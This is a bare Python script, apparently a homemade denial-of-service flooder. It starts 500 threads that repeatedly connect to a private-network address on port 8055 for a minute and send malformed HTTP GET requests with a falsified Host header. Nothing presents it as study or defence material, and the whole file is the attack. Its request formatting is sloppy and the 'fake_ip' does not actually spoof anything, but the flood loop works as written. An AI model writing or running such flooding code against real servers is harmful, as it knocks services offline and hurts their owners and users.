import socket
import threading
import random
import time
import sys

target ='192.168.1.44'
fake_ip = '123.231.44.22'
port = 8055

msg = bytes(random.getrandbits(10))
duration = 60 # in seconds

timeout = time.time() + duration



def attack():
    
    sent_packets = 0

    while time.time() < timeout:
      attack_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      attack_socket.connect(('192.168.1.44',port))
      attack_socket.sendto(('GET /' + target + "HTTP/1.1\r\n").encode('ascii'),(target,port))
      attack_socket.sendto(('HOST :' + fake_ip + "\r\n\r\n").encode('ascii'),(target,port))
      sent_packets += 1
      attack_socket.close()


for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()